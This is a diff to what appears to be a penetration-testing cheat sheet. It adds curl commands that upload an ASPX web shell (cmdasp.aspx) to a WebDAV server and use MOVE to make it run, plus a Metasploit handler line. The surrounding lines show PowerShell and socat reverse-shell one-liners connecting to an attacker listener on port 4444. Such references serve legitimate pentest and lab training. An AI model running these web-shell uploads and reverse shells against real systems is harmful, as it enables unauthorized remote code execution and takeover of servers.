@@ -69,7 +69,10 @@ $ wfuzz -c -w <wordlist> -u http://FUZZ.<domain>
 $ nikto -h <IP address>
 $ curl -v -X OPTIONS <IP address>
 $ curl http://<IP address> --upload-file test.txt
-$ curl -X PUT http://<IP address>/test.txt -d @test.txt 
+$ curl -X PUT http://<IP address>/test.txt -d @test.txt
+$ curl -X PUT http://<IP address>/test.txt --data-binary @cmdasp.aspx 
+$ curl -X PUT http://<IP address>/test.txt -d @cmdasp.aspx 
+$ curl -X MOVE -H 'Destination:http://<IP address>/cmdasp.aspx' http://<IP address>/test.txt
 $ davtest -url http://<IP address>
 ```
 
@@ -470,6 +473,7 @@ $ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP add
 https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
 $ socat file:`tty`,raw,echo=0 tcp-listen:4444
 $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP address>:4444
+msf> use exploit/multi/handler
 ```
 
 MSFvenom
